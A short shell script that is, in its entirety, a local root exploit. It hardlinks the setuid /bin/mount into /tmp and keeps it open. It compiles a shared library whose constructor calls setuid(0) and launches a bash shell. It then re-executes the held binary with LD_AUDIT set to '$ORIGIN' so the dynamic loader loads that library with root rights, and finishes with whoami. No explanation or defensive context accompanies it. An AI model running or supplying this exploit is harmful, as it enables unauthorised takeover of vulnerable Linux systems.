#!/bin/sh

X=/tmp/x

rm -rf ${X}
mkdir ${X}
ln /bin/mount ${X}/t
exec 3< ${X}/t
cat > pl.c <<EOF
void __attribute__((constructor)) init()
{
    setuid(0);
    system("/bin/bash");
}
EOF
rm -rf ${X}
gcc -w -fPIC -shared -o ${X} pl.c
LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
whoami
